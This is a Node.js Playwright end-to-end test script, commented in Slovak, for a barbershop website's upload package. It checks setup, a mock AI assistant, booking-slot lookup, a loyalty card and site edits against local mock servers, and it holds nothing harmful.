#!/usr/bin/env node
// Test plného balíka pre www.barbershop30.sk v prehliadači: zostavený balík sa nahrá do napodobeniny koreňa domény
// (rezervačný systém Laravel: index.php, /rezervacia, /admin, .htaccess, css, js…) a beží pod php -S so smerovačom, ktorý
// napodobní pravidlá .htaccess balíka. Asistent hovorí s falošným API (asistent/testy/mock-api.php), voľné termíny
// číta z falošného rezervačného systému; nič nejde von (každá požiadavka mimo lokálneho servera sa zastaví a ohlási).
//
//   bash source/tools/balik-domena.sh --von=<priečinok> --bez-zip
//   node source/tools/sprava-test.mjs --balik=<priečinok>/NAHRAT-NA-HOSTING [--port=9540] [--out=dir] [--tmp=dir] [--bez-exportu]
//   (porty: falošné API, web = port + 1)
//
// Kontroly: web bez nastavenia ako statický balík; prvé nastavenie kódom zo súboru; asistent len s kľúčom a súhlasom;
// voľné termíny (objednávka sa nikdy neodošle); vernostná kartička; úpravy webu (text, cena, tím s fotkou, kontakt a hodiny,
// odpovede asistenta), záloha, krok späť, súbeh; export a jeho prevzatie do kópie repozitára; bezpečnosť cez HTTP;
// telefón 390 px; obnova prístupu a zámok po zlých pokusoch; rezervačný systém nedotknutý.
import path from 'node:path';
import fs from 'node:fs';
import os from 'node:os';
import crypto from 'node:crypto';
import { spawn, spawnSync } from 'node:child_process';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';
const SITE = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', '..');
const ROOT = path.resolve(SITE, '..');
const require = createRequire(path.join(SITE, 'source', 'shot.mjs'));
const { chromium } = require('playwright');
const opt = Object.fromEntries(process.argv.slice(2).filter((a) => a.startsWith('--')).map((a) => { const [k, v] = a.slice(2).split('='); return [k, v ?? true]; }));
const BALIK = path.resolve(String(opt.balik || ''));
if (!opt.balik || !fs.existsSync(path.join(BALIK, 'sprava', 'index.php'))) { console.error('použitie: node source/tools/sprava-test.mjs --balik=<NAHRAT-NA-HOSTING> [--port=9540] [--out=dir] [--tmp=dir]'); process.exit(2); }
const P0 = Number(opt.port || 9540), P1 = P0 + 1, Z = `http://127.0.0.1:${P1}`;
const OUT = path.resolve(opt.out || path.join(SITE, 'docs', 'screenshots', 'sprava'));
fs.mkdirSync(OUT, { recursive: true });
const T = fs.mkdtempSync(path.join(opt.tmp ? path.resolve(String(opt.tmp)) : os.tmpdir(), 'b30-sprava-'));
const WEB = path.join(T, 'web'), UDAJE = path.join(T, 'barbershop30-udaje');
let failed = 0, pocet = 0;
const ok = (c, m, x = '') => { pocet++; console.log(`${c ? 'OK  ' : 'FAIL'} ${m}${x ? '  ' + x : ''}`); if (!c) failed++; };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const sha = (f) => crypto.createHash('sha256').update(fs.readFileSync(f)).digest('hex');
const strom = (dir) => { const von = {}; const chod = (d) => { for (const e of fs.readdirSync(d, { withFileTypes: true })) { const p = path.join(d, e.name); if (e.isDirectory()) chod(p); else von[path.relative(dir, p)] = sha(p); } }; chod(dir); return von; };
const citaj = (c) => fs.readFileSync(path.join(WEB, c), 'utf8');
const KLUC = ['sk', 'ant', 'skusobny-kluc-0123456789abcdef'].join('-');     // skúšobný kľúč (falošné API), nie skutočný
const HESLO = 'noznice-hreben-mostna', HESLO2 = 'britva-remen-stolicka', RECEPCIA = 'recepcia-pult-kava';

/* ---------- napodobenina hostingu ---------- */
fs.mkdirSync(WEB, { recursive: true });
const nap = spawnSync('php', [path.join(ROOT, 'barbershop-sprava', 'testy', 'napodobenina.php'), WEB, path.join(ROOT, 'asistent', 'testy', 'mock-rezervacie.php')], { encoding: 'utf8' });
if (nap.status !== 0) { console.error(nap.stderr); process.exit(1); }
const laravelPred = strom(WEB);
const kolizie = fs.readdirSync(BALIK).filter((n) => fs.existsSync(path.join(WEB, n)));
ok(kolizie.length === 0, 'balík nemá v koreni nič, čo patrí rezervačnému systému', kolizie.join(', '));
fs.cpSync(BALIK, WEB, { recursive: true });
fs.writeFileSync(path.join(T, 'scen.json'), '{}');
const env = { ...process.env, MOCK_LOG: path.join(T, 'rez.log'), MOCK_SCEN: path.join(T, 'scen.json'), ANTHROPIC_BASE_URL: `http://127.0.0.1:${P0}`, B30_TEST_KALENDAR: `${Z}/rezervacia`, PHP_CLI_SERVER_WORKERS: '8' };
const logSrv = fs.openSync(path.join(T, 'server.log'), 'w');
const mock = spawn('php', ['-S', `127.0.0.1:${P0}`, path.join(ROOT, 'asistent', 'testy', 'mock-api.php')], { env: { ...process.env, MOCK_LOG: path.join(T, 'api.log') }, stdio: 'ignore' });
const srv = spawn('php', ['-S', `127.0.0.1:${P1}`, '-t', WEB, path.join(ROOT, 'barbershop-sprava', 'testy', 'router.php')], { env, cwd: WEB, stdio: ['ignore', logSrv, logSrv] });
const uprac = () => { try { mock.kill(); srv.kill(); } catch (e) { /* nič */ } if (!opt.nechaj) fs.rmSync(T, { recursive: true, force: true }); };
process.on('exit', uprac);
await sleep(1200);

const browser = await chromium.launch();
const vonku = [], chyby = [];
async function okno(w = 1280, h = 900, extra = {}) {
  const ctx = await browser.newContext({ viewport: { width: w, height: h }, isMobile: w < 800, hasTouch: w < 800, locale: 'sk-SK', colorScheme: 'dark', acceptDownloads: true, ...extra });
  await ctx.route((u) => !u.href.startsWith(Z + '/') && !u.href.startsWith('data:') && !u.href.startsWith('blob:'), (rt) => { vonku.push(rt.request().url()); return rt.request().resourceType() === 'document' ? rt.fulfill({ contentType: 'text/html', body: '<p>mimo testu</p>' }) : rt.abort(); });
  const page = await ctx.newPage();
  page.on('pageerror', (e) => chyby.push(String(e)));
  page.on('dialog', (d) => d.accept());
  return { ctx, page };
}
const text = (page) => page.evaluate(() => document.querySelector('main').innerText.replace(/\s+/g, ' '));
const hlaska = (page) => page.evaluate(() => (document.querySelector('.hlaska') || { innerText: '' }).innerText.replace(/\s+/g, ' '));
const kod = (subor) => (fs.readFileSync(path.join(UDAJE, subor), 'utf8').match(/Kód: ([A-Z0-9-]+)/) || [])[1];
const odosli = (page, sel) => Promise.all([page.waitForNavigation(), page.click(sel)]);
const tlacidlo = (page, akcia) => odosli(page, `form:has(input[name=a][value="${akcia}"]) button[type=submit]`);
const htmlTag = (c) => (citaj(c).match(/<html[^>]*>/) || [''])[0];
const zapnute = (c) => / data-zapnute /.test((citaj(c).match(/<script src="[./]*assets\/vernost\.js"[^>]*>/) || [''])[0]);

try {
  /* ---------- 0. po nahratí bez nastavenia: web ako statický balík ---------- */
  console.log('\n0. web po nahratí, bez nastavenia');
  {
    const { ctx, page } = await okno(390, 844);
    const pozadie = [];
    page.on('request', (r) => { if (/\/(asistent|vernost|sprava)\//.test(new URL(r.url()).pathname)) pozadie.push(r.url()); });
    await page.goto(Z + '/');
    ok(/<html lang="sk" data-motion="on">/.test(htmlTag('index.html')) && !zapnute('index.html'), 'index.html v balíku nemá žiadny prepínač');
    ok((await page.title()).length > 5 && await page.locator('#uvod').count() === 1, 'úvod: nový web (index.html má prednosť pred index.php)');
    await page.mouse.move(10, 10); await page.touchscreen.tap(195, 300); await sleep(3500);
    ok(await page.locator('.asi-btn').count() === 0, 'asistent sa neukáže');
    ok(await page.evaluate(() => { const a = document.querySelector('footer [data-vernost-karta]'); return !!a && !!a.closest('li[hidden]'); }), 'vernostná kartička je skrytá');
    await page.locator('#uvod a.btn-primary', { hasText: 'Objednať sa' }).first().click();
    await page.waitForFunction(() => { const h = document.querySelector('.obj[open] .obj-h'); return h && /nejde/.test(h.textContent); }, null, { timeout: 9000 }).catch(() => {});
    const st = await page.evaluate(() => { const t = document.querySelector('.obj[open] .obj-telo'); return t ? { h: document.querySelector('.obj[open] .obj-h').textContent, tel: !!t.querySelector('a[href="tel:+421951267203"]'), sys: !!t.querySelector('a[data-obj-priamo][href*="barbershop30.sk/rezervacia"]') } : null; });
    ok(st && /nejde – zavolaj/.test(st.h) && st.tel && st.sys, 'okno objednávky ponúkne Zavolať a odkaz na rezervačný systém', JSON.stringify(st));
    ok(pozadie.length === 0, 'web nič neposiela na asistent/, vernost/ ani sprava/', pozadie.join(' '));
    const en = await page.request.get(Z + '/en/');
    ok(en.status() === 200 && /<html lang="en" data-zdroj="en"/.test(await en.text()), '/en/ je anglická stránka');
    const rez = await page.request.get(Z + '/rezervacia'); const adm = await page.request.get(Z + '/admin', { maxRedirects: 0 });
    ok(rez.status() === 200 && /v-order-component/.test(await rez.text()) && adm.status() === 302 && /\/admin\/login$/.test(adm.headers().location || ''), '/rezervacia a /admin patria rezervačnému systému');
    ok(!fs.existsSync(UDAJE) && !fs.readdirSync(WEB).some((n) => n.startsWith('b30-udaje-')), 'návštevník webu nezaloží priečinok údajov');
    await ctx.close();
  }

  /* ---------- 1. prvé nastavenie: kontrola hostingu, kód zo súboru, meno a heslo ---------- */
  console.log('\n1. prvé nastavenie');
  const { ctx, page } = await okno(1280, 900);
  await page.goto(Z + '/sprava/');
  ok(/Prvé nastavenie/.test(await page.title()) && /Kontrola hostingu/.test(await text(page)), 'správa: prvé nastavenie s kontrolou hostingu');
  ok(/Hosting vyhovuje/.test(await text(page)), 'kontrola hostingu: povinné body v poriadku', (await text(page)).slice(150, 330));
  ok(fs.existsSync(UDAJE) && !fs.existsSync(path.join(UDAJE, 'PRVY-KOD.txt')), 'priečinok údajov je mimo webu, kód ešte neexistuje');
  ok(!/\/dev\/|barbershop30-udaje|PHP 8\.\d\.\d/.test(await page.content()), 'neprihlásený nevidí cesty ani presnú verziu PHP');
  ok(await page.locator('input[name=meno]').count() === 0, 'bez kódu sa účet založiť nedá');
  { const r = await page.request.post(Z + '/sprava/', { form: { a: 'ucet', meno: 'Zlodej', heslo: HESLO, heslo2: HESLO, _t: await page.inputValue('input[name=_t]') } }); ok(!fs.existsSync(path.join(UDAJE, 'ucty.php')) && r.status() < 500, 'účet bez overeného kódu sa nevytvorí ani priamou požiadavkou'); }
  await page.goto(Z + '/sprava/');
  await tlacidlo(page, 'vytvor-kod');
  const kod1 = kod('PRVY-KOD.txt');
  ok(/^[A-Z2-9]{4}(-[A-Z2-9]{4}){3}$/.test(kod1 || '') && !(await page.content()).includes(kod1), 'kód je len v súbore PRVY-KOD.txt na hostingu, stránka ho neukáže');
  ok(!JSON.stringify(fs.readFileSync(path.join(UDAJE, 'pristup.php'), 'utf8')).includes(kod1.replace(/-/g, '')), 'v nastavení je len odtlačok kódu');
  await page.fill('#kod', 'AAAA-BBBB-CCCC-DDDD'); await odosli(page, 'form:has(#kod) button');
  ok(/Kód nesedí/.test(await hlaska(page)) && fs.existsSync(path.join(UDAJE, 'PRVY-KOD.txt')), 'zlý kód: odmietnutý, súbor ostáva');
  await page.fill('#kod', kod1.toLowerCase().replace(/-/g, ' ')); await odosli(page, 'form:has(#kod) button');
  ok(/Kód sedí/.test(await hlaska(page)) && !fs.existsSync(path.join(UDAJE, 'PRVY-KOD.txt')), 'správny kód: prijatý, súbor s kódom zmazaný');
  ok(/Úplnosť balíka/.test(await text(page)) && /Rezervačný systém je na svojom mieste/.test(await text(page)), 'po overení kódu vidno podrobnosti kontroly');
  await page.screenshot({ path: path.join(OUT, 'sprava-prve-nastavenie.png'), fullPage: true });
  await page.fill('#meno', 'Lajko'); await page.fill('#heslo', 'barbershop30'); await page.fill('#heslo2', 'barbershop30'); await odosli(page, 'form:has(#meno) button');
  ok(/názov podniku|aspoň 10/.test(await hlaska(page)), 'slabé heslo odmietnuté', await hlaska(page));
  await page.fill('#meno', 'Lajko'); await page.fill('#heslo', HESLO); await page.fill('#heslo2', HESLO); await odosli(page, 'form:has(#meno) button');
  ok(/Nastavenia/.test(await page.title()) && /Správa je nastavená/.test(await hlaska(page)), 'účet vytvorený, pokračuje sa nastaveniami');
  const ucty = fs.readFileSync(path.join(UDAJE, 'ucty.php'), 'utf8');
  ok(/\$(argon2id|2y)\$/.test(ucty) && !ucty.includes(HESLO) && ucty.startsWith('<?php exit; ?>'), 'heslo je uložené len ako odtlačok v súbore, ktorý pri priamej požiadavke nič nevypíše');

  /* ---------- 6. asistent Barber ---------- */
  console.log('\n6. asistent Barber');
  await page.fill('#kluc', 'toto-nie-je-kluc'); await page.check('section#asistent input[name=suhlas]'); await odosli(page, 'section#asistent form:has(#kluc) button');
  ok(/nevyzerá ako kľúč/.test(await hlaska(page)), 'neplatný kľúč odmietnutý');
  await page.fill('#kluc', KLUC); await page.uncheck('section#asistent input[name=suhlas]'); await odosli(page, 'section#asistent form:has(#kluc) button');
  ok(/len so súhlasom/.test(await hlaska(page)) && !/data-asistent/.test(htmlTag('index.html')), 'kľúč bez súhlasu: asistent sa nezapne');
  await page.fill('#kluc', KLUC); await page.check('section#asistent input[name=suhlas]'); await odosli(page, 'section#asistent form:has(#kluc) button');
  ok(/Asistent Barber je zapnutý/.test(await hlaska(page)), 'kľúč a súhlas: zapnutý', await hlaska(page));
  ok(htmlTag('index.html').includes(`data-asistent="${Z}/asistent/api.php"`) && htmlTag('en/index.html').includes(`data-asistent="${Z}/asistent/api.php"`), 'prepínač je v index.html aj en/index.html');
  ok(!(await page.content()).includes(KLUC) && (await page.inputValue('#kluc')) === '' && /Kľúč je uložený od/.test(await text(page)), 'kľúč sa po uložení nezobrazí');
  {
    const o = await okno(1280, 900); const p = o.page;
    await p.goto(Z + '/'); await p.evaluate(() => window.scrollTo(0, 30));
    const btn = p.locator('.asi-btn');
    await btn.waitFor({ state: 'visible', timeout: 12000 }).catch(() => {});
    ok(await btn.count() === 1 && (await btn.locator('.asi-ai').innerText().catch(() => '')).trim() === 'AI', 'web: ikona asistenta s označením AI');
    await btn.click(); await p.locator('.asi-form textarea').waitFor({ timeout: 8000 });
    const d = new Date(Date.now() + 864e5); while (d.getDay() === 0) d.setDate(d.getDate() + 1);
    const den = `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
    await p.evaluate(() => { window.__dlzky = new Set(); new MutationObserver(() => { const b = [...document.querySelectorAll('.asi-a')].pop(); if (b) window.__dlzky.add(b.textContent.length); }).observe(document.querySelector('#asi-panel'), { childList: true, subtree: true, characterData: true }); });
    await p.locator('.asi-form textarea').fill('Aké je hlavné mesto Austrálie a koľko má obyvateľov?'); await p.keyboard.press('Enter');
    await p.waitForFunction(() => document.querySelectorAll('.asi-a').length >= 1 && !document.querySelector('.asi-send').disabled && !document.querySelector('.asi-pise'), null, { timeout: 20000 }).catch(() => {});
    const odp = await p.locator('.asi-a').last().innerText().catch(() => '');
    const api = fs.existsSync(path.join(T, 'api.log')) ? fs.readFileSync(path.join(T, 'api.log'), 'utf8') : '';
    ok(odp.length > 10 && api.includes(`"kluc":"${KLUC}"`), 'otázka: odpoveď prišla zo servera cez (falošné) API s kľúčom zo správy', odp.slice(0, 80));
    ok((await p.evaluate(() => window.__dlzky.size)) >= 3, 'odpoveď prichádza po kúskoch', String(await p.evaluate(() => window.__dlzky.size)));
    ok(!(await p.content()).includes(KLUC), 'kľúč sa nedostane do prehliadača');
    await o.ctx.close();
    globalThis.__den = den;
  }

  /* ---------- 7. voľné termíny ---------- */
  console.log('\n7. voľné termíny v okne objednávky');
  await page.goto(Z + '/sprava/?s=nastavenia');
  await page.check('section#terminy input[name=zapnut]'); await page.uncheck('section#terminy input[name=suhlas]'); await odosli(page, 'section#terminy form:has(input[name=zapnut]) button');
  ok(/len so súhlasom/.test(await hlaska(page)) && !/data-objednavka/.test(htmlTag('index.html')), 'bez súhlasu sa voľné termíny nezapnú');
  await page.check('section#terminy input[name=zapnut]'); await page.check('section#terminy input[name=suhlas]'); await odosli(page, 'section#terminy form:has(input[name=zapnut]) button');
  ok(/Voľné termíny sú zapnuté/.test(await hlaska(page)) && htmlTag('index.html').includes(`data-objednavka="${Z}/asistent/api.php"`), 'so súhlasom zapnuté, prepínač na webe', await hlaska(page));
  await tlacidlo(page, 'kalendar-skusit');
  ok(/Funguje.*Nikolas.*Adrian/.test(await hlaska(page)), 'Vyskúšať: jedno čítanie barberov', await hlaska(page));
  {
    const o = await okno(390, 844); const p = o.page;
    await p.goto(Z + '/'); await p.mouse.move(10, 10); await sleep(800);
    await p.locator('#uvod a.btn-primary', { hasText: 'Objednať sa' }).first().click();
    await p.waitForSelector('.obj[open] .obj-sluzby button', { timeout: 15000 });
    await p.locator('.obj-sluzby button', { hasText: 'Pánsky strih a úprava brady' }).click();
    await p.waitForSelector('.obj-tim button', { timeout: 20000 }).catch(() => {});
    const tim = await p.locator('.obj-tim button').allTextContents();
    ok(tim.some((t) => /Nikolas/.test(t)) && tim.some((t) => /Adrian/.test(t)), 'okno: barberi z rezervačného systému', tim.join(' | ').replace(/\s+/g, ' ').slice(0, 120));
    await p.locator('.obj-tim button', { hasText: 'Adrian' }).click();
    await p.waitForSelector('.obj-mriezka button', { timeout: 15000 }).catch(() => {});
    const casy = await p.locator('.obj-casy .obj-mriezka button').allTextContents();
    ok(await p.locator('.obj-dni button').count() >= 5 && casy.length >= 2 && casy.every((c) => /^\s*\d{1,2}:\d{2}/.test(c)), 'okno: dni a voľné časy', casy.join(' ').replace(/\s+/g, ' ').slice(0, 80));
    await p.screenshot({ path: path.join(OUT, 'web-volne-terminy-390.png') });
    await o.ctx.close();
    // asistent overí termín nástrojom (model → server → rezervačný systém)
    const o2 = await okno(1280, 900); const p2 = o2.page;
    await p2.goto(Z + '/'); await p2.evaluate(() => window.scrollTo(0, 30));
    await p2.locator('.asi-btn').waitFor({ state: 'visible', timeout: 12000 }).catch(() => {});
    await p2.locator('.asi-btn').click(); await p2.locator('.asi-form textarea').waitFor({ timeout: 8000 });
    await p2.locator('.asi-form textarea').fill(`TERMIN Adrián ${globalThis.__den}`); await p2.keyboard.press('Enter');
    await p2.waitForSelector('.asi-kal', { timeout: 20000 }).catch(() => {});
    ok(/\d{1,2}:\d{2}/.test(await p2.locator('.asi-kal').last().innerText().catch(() => '')), 'asistent: karta s overenými voľnými časmi');
    await o2.ctx.close();
  }
  const rezLog = fs.existsSync(path.join(T, 'rez.log')) ? fs.readFileSync(path.join(T, 'rez.log'), 'utf8') : '';
  const metody = [...new Set([...rezLog.matchAll(/"metoda":"([^"]+)"/g)].map((m) => m[1]))];
  ok(metody.length > 0 && !/makeOrder/.test(rezLog) && metody.every((m) => ['getEmployees', 'getCalendar', 'getTime'].includes(m)), 'rezervačný systém dostal len čítanie, objednávka (makeOrder) nikdy', metody.join(', '));

  /* ---------- 8. vernostná kartička ---------- */
  console.log('\n8. vernostná kartička');
  {
    const r = await page.request.post(Z + '/vernost/api/?a=registracia', { headers: { 'Content-Type': 'application/json' }, data: { prevadzka: 'barbershop', meno: 'Skoro Klient', telefon: '0908 111 222', suhlas: true } });
    ok(r.status() === 503 && !zapnute('index.html'), 'pred heslom recepcie: prihláška na webe mlčí a server kartičku nezaloží', String(r.status()));
  }
  await page.goto(Z + '/sprava/?s=nastavenia');
  await page.fill('#vheslo', 'kratke'); await page.fill('#vheslo2', 'kratke'); await odosli(page, 'section#karticka form:has(#vheslo) button');
  ok(/aspoň 10 znakov/.test(await hlaska(page)), 'krátke heslo recepcie odmietnuté');
  await page.fill('#vheslo', RECEPCIA); await page.fill('#vheslo2', RECEPCIA); await odosli(page, 'section#karticka form:has(#vheslo) button');
  ok(/Vernostná kartička je zapnutá/.test(await hlaska(page)) && zapnute('index.html') && zapnute('en/index.html'), 'heslo recepcie nastavené: prihláška zapnutá na webe', await hlaska(page));
  const tajne = fs.readFileSync(path.join(UDAJE, 'tajne.php'), 'utf8');
  ok(!tajne.includes(RECEPCIA) && /\$2y\$/.test(tajne) && tajne.includes(KLUC), 'tajne.php: odtlačok hesla recepcie a kľúč, heslo čitateľne nie');
  {
    const o = await okno(390, 844); const p = o.page;
    await p.goto(Z + '/'); await sleep(1500);
    ok(await p.evaluate(() => { const a = document.querySelector('footer [data-vernost-karta]'); return !!a && !a.closest('li[hidden]'); }), 'web: odkaz Vernostná kartička v pätičke je viditeľný');
    await p.goto(Z + '/karta/?nova'); await p.waitForSelector('.zaloz form');
    await p.fill('input[name=meno]', 'Marek Pult'); await p.fill('input[name=telefon]', '0908 777 888'); await p.check('.zaloz .prepinac input >> nth=0');
    await p.click('.zaloz button[type=submit]');
    await p.waitForSelector('.karta', { timeout: 10000 }).catch(() => {});
    ok(/\/karta\/\?k=[A-Za-z0-9_-]{22}$/.test(p.url()) && /Marek/.test(await p.textContent('main')), 'kartička založená na /karta/ tejto domény', p.url().replace(Z, ''));
    const ochr = await p.$$eval('a', (a) => a.filter((x) => /Ochrana/.test(x.textContent)).map((x) => x.href));
    const ou = ochr.length ? await (await p.request.get(ochr[0])).text() : '';
    ok(ochr.length > 0 && ochr[0] === `${Z}/vernost/ochrana-udajov.html` && /www\.barbershop30\.sk/.test(ou) && !/HEAD/.test(ou), 'ochrana údajov kartičky: znenie pre túto doménu (bez HEAD SPA)');
    await p.screenshot({ path: path.join(OUT, 'web-karticka-390.png') });
    await o.ctx.close();
    const a = await okno(1280, 900); const pa = a.page;
    await pa.goto(Z + '/vernost/admin/'); await pa.waitForSelector('#h');
    const prevadzky = await pa.$$eval('#p option', (o) => o.map((x) => x.value).filter(Boolean)).catch(() => []);
    ok(!prevadzky.includes('headspa'), 'admin kartičiek: len Barbershop 30', prevadzky.join(','));
    if (await pa.locator('#p').count()) await pa.selectOption('#p', 'barbershop').catch(() => {});
    await pa.fill('#h', RECEPCIA); await pa.click('button[type=submit]');
    await pa.waitForSelector('.zoznam .riadok', { timeout: 10000 }).catch(() => {});
    await pa.click('.zoznam .riadok').catch(() => {}); await pa.waitForSelector('text=Zapísať návštevu', { timeout: 8000 }).catch(() => {});
    await pa.click('text=Zapísať návštevu').catch(() => {}); await pa.waitForSelector('.hlaska.ok', { timeout: 8000 }).catch(() => {});
    ok(/bod/.test(await pa.textContent('.hlaska.ok').catch(() => '')), 'recepcia: prihlásenie heslom zo správy a zápis návštevy', (await pa.textContent('.hlaska.ok').catch(() => '')).slice(0, 60));
    const hs = await pa.request.post(Z + '/vernost/api/?a=prihlasenie', { headers: { 'Content-Type': 'application/json', 'X-Vernost-Admin': '1' }, data: { prevadzka: 'headspa', heslo: RECEPCIA } });
    ok(hs.status() === 400 && /Neznáma prevádzka/.test(await hs.text()), 'prevádzka headspa je na tomto serveri odmietnutá');
    await a.ctx.close();
  }
  ok(fs.readdirSync(path.join(UDAJE, 'vernost')).some((n) => /^vernost-[0-9a-f]{32}\.sqlite$/.test(n)) && !fs.readdirSync(path.join(WEB, 'vernost', 'data')).some((n) => /sqlite|meno\.php/.test(n)), 'databáza kartičiek je v priečinku údajov, nie vo webe');
  await page.goto(Z + '/sprava/');
  ok((await page.locator('ul.body li.ok').count()) === 3 && /Asistent Barber na webe zapnuté/.test(await text(page)), 'úvod správy: všetky tri funkcie na webe zapnuté');
  await page.screenshot({ path: path.join(OUT, 'sprava-domov.png'), fullPage: true });
  { const z = (await import('node:zlib')).gzipSync(fs.readFileSync(path.join(WEB, 'index.html')), { level: 9 }).length; ok(z < 14600, 'váha index.html so všetkými prepínačmi pod hranicou 14 600 B', `${z} B`); }

  /* ---------- 2. a 3. úpravy webu ---------- */
  console.log('\n2. a 3. úpravy webu');
  const n = (s) => s.replace(/\s+/g, ' ').trim();
  const idx0 = citaj('index.html'), en0 = citaj('en/index.html'), app0 = citaj('assets/app.js'), api0 = citaj('asistent/api.php'), vj0 = citaj('vernost/lib/jadro.php');
  const up = await okno(390, 844); await up.ctx.addCookies(await ctx.cookies()); const u = up.page;   // tá istá relácia správy na telefóne
  await u.goto(Z + '/sprava/upravy/');
  await u.waitForSelector('#app:not([hidden]) .tab[data-tab="texty"] .blk', { timeout: 30000 });
  ok(await u.isHidden('#login') && await u.locator('#token').count() === 0, 'úpravy: načítané bez kľúča GitHub (relácia správy)');
  const taby = await u.$$eval('#tabs button', (b) => b.map((x) => x.textContent));
  ok(taby.join('|') === 'Texty|Cenník|Tím|Galéria|Kontakt a hodiny|Odpovede asistenta|Kartička', 'úpravy: záložky ako v admine', taby.join(', '));
  await u.screenshot({ path: path.join(OUT, 'upravy-texty-390.png') });
  const hook = await u.evaluate(() => { const b = [...document.querySelectorAll('.tab[data-tab="texty"] .blk')].find((x) => /háčik|Objednaj|Vyber si/.test(x.querySelector('input,textarea').value) && x.querySelector('details.tr')); return b.querySelector('input,textarea').value; });
  const novyText = hook.replace(/\.?$/, ' ešte dnes.');
  await u.evaluate(({ stary, novy }) => { const el = [...document.querySelectorAll('.tab[data-tab="texty"] .blk input, .tab[data-tab="texty"] .blk textarea')].find((x) => x.value === stary); el.value = novy; el.dispatchEvent(new Event('input')); }, { stary: hook, novy: novyText });
  await u.click('#tabs button[data-tab="cennik"]');
  const kartaCena = u.locator('.tab[data-tab="cennik"] .card').first();
  await kartaCena.locator(':scope > summary').click();
  const staraCena = await kartaCena.locator('input[inputmode="decimal"]').inputValue();
  const novaCena = String(Number(staraCena.replace(',', '.')) + 1).replace('.', ',');
  await kartaCena.locator('input[inputmode="decimal"]').fill(novaCena);
  await u.click('#tabs button[data-tab="tim"]');
  const kartaTim = u.locator('.tab[data-tab="tim"] .card').first();
  await kartaTim.locator(':scope > summary').click();
  const foto = await u.evaluate(async () => { const c = document.createElement('canvas'); c.width = 1200; c.height = 1500; const g = c.getContext('2d'); g.fillStyle = '#7a4a2a'; g.fillRect(0, 0, 1200, 1500); g.fillStyle = '#e0601c'; g.fillRect(300, 300, 600, 600); const b = await new Promise((r) => c.toBlob(r, 'image/jpeg', 0.9)); return [...new Uint8Array(await b.arrayBuffer())]; });
  await kartaTim.locator('input[type=file]').setInputFiles({ name: 'foto.jpg', mimeType: 'image/jpeg', buffer: Buffer.from(foto) });
  await u.waitForFunction(() => /nová fotka/.test(document.querySelector('#zoznam').textContent));
  const uloz = async (p) => { await p.click('#ulozit'); await p.waitForFunction(() => { const m = document.querySelector('#saveMsg'); return !m.hidden && /Uložené|Neuložené|zmenil inde/.test(m.textContent); }, null, { timeout: 60000 }); return p.textContent('#saveMsg'); };
  let sprava = await uloz(u);
  ok(/^Uložené\. Na webe je to hneď\./.test(sprava), 'uloženie 1 (text, cena, fotka tímu) prešlo', sprava);
  const idx1 = citaj('index.html'), en1 = citaj('en/index.html');
  ok(n(idx1).includes(n(novyText)) && idx1 !== idx0, '/index.html má nový text hneď');
  ok(!n(en1).includes(n(novyText)) && en1 !== en0 && /<html lang="en" data-zdroj="en"/.test(en1), '/en/index.html je vytvorená nanovo, preklad ostal (kľúč presunutý)');
  ok(JSON.parse(citaj('assets/i18n/en.json'))[n(novyText)] !== undefined, 'preklad presunutý na nový kľúč v assets/i18n/en.json');
  ok(htmlTag('index.html').includes('data-asistent=') && htmlTag('index.html').includes('data-objednavka=') && zapnute('index.html') && htmlTag('en/index.html').includes('data-asistent=') && zapnute('en/index.html'), 'prepínače ostali po uložení v oboch stránkach');
  ok(/<link rel="canonical" href="https:\/\/www\.barbershop30\.sk\/"/.test(idx1) && !idx1.includes('github.io') && !/<!--/.test(idx1.replace(/<script[\s\S]*?<\/script>/g, '')), 'verejná stránka: adresa domény, bez komentárov (to isté zostavenie ako balík)');
  ok(new RegExp(`<p class="price-amount">${novaCena}[\\s ]€</p>`).test(idx1) && fs.readFileSync(path.join(WEB, 'asistent/znalosti/barbershop.md'), 'utf8').includes(`${novaCena} €`), 'cena: v cenníku na webe aj v znalostiach asistenta na serveri');
  const fotky = fs.readdirSync(path.join(WEB, 'assets/img')).filter((x) => /^tim-.*-(480|820)\.(webp|jpg)$/.test(x) && !fs.existsSync(path.join(BALIK, 'assets/img', x)));
  ok(fotky.length === 4 && fotky.every((x) => idx1.includes(x)), 'fotka tímu: 4 súbory (WebP a JPEG) na webe a v stránke', fotky.join(', '));
  { const b = fs.readFileSync(path.join(WEB, 'assets/img', fotky.find((x) => x.endsWith('.webp')))); const r = await u.request.get(`${Z}/assets/img/${fotky.find((x) => x.endsWith('.jpg'))}`); ok(b.subarray(8, 12).toString() === 'WEBP' && r.status() === 200 && /image\/jpeg/.test(r.headers()['content-type']), 'fotky prekódoval server (WebP, JPEG) a web ich podáva'); }
  const zalohy = fs.readdirSync(path.join(UDAJE, 'zalohy')).filter((x) => /^\d{8}-/.test(x));
  ok(zalohy.length === 1 && fs.existsSync(path.join(UDAJE, 'zalohy', zalohy[0], 'web/index.html')) && fs.existsSync(path.join(UDAJE, 'zalohy', zalohy[0], 'web/en/index.html')) && JSON.parse(fs.readFileSync(path.join(UDAJE, 'zalohy', zalohy[0], 'plan.json'), 'utf8')).stav === 'hotove', 'záloha stavu pred uložením (slovenská aj anglická stránka) a hotový plán');

  // kontakt a hodiny: telefón a hodiny vo všetkých súboroch, v kóde len číslice
  await u.click('#tabs button[data-tab="kontakt"]');
  await u.fill('.tab[data-tab="kontakt"] input[type=tel]', '0911 222 333');
  await u.selectOption('.tab[data-tab="kontakt"] select[aria-label="Pondelok až piatok do"]', '20');
  await sleep(400);
  sprava = await uloz(u);
  ok(/^Uložené/.test(sprava), 'uloženie 2 (telefón a hodiny) prešlo', sprava);
  const bezCisel = (s) => s.replace(/\d+/g, '0');
  const app1 = citaj('assets/app.js'), api1 = citaj('asistent/api.php'), vj1 = citaj('vernost/lib/jadro.php');
  ok(app1 !== app0 && bezCisel(app1) === bezCisel(app0) && /1: \[9, 20\]/.test(app1), 'app.js na webe: zmenené len číslice (HOURS do 20)');
  ok(api1 !== api0 && bezCisel(api1) === bezCisel(api0) && api1.includes('0911 222 333') && spawnSync('php', ['-l', path.join(WEB, 'asistent/api.php')]).status === 0, 'asistent/api.php na serveri: len číslice, stále platné PHP');
  ok(vj1 !== vj0 && bezCisel(vj1) === bezCisel(vj0) && vj1.includes('+421911222333'), 'vernost/lib/jadro.php na serveri: len číslice');
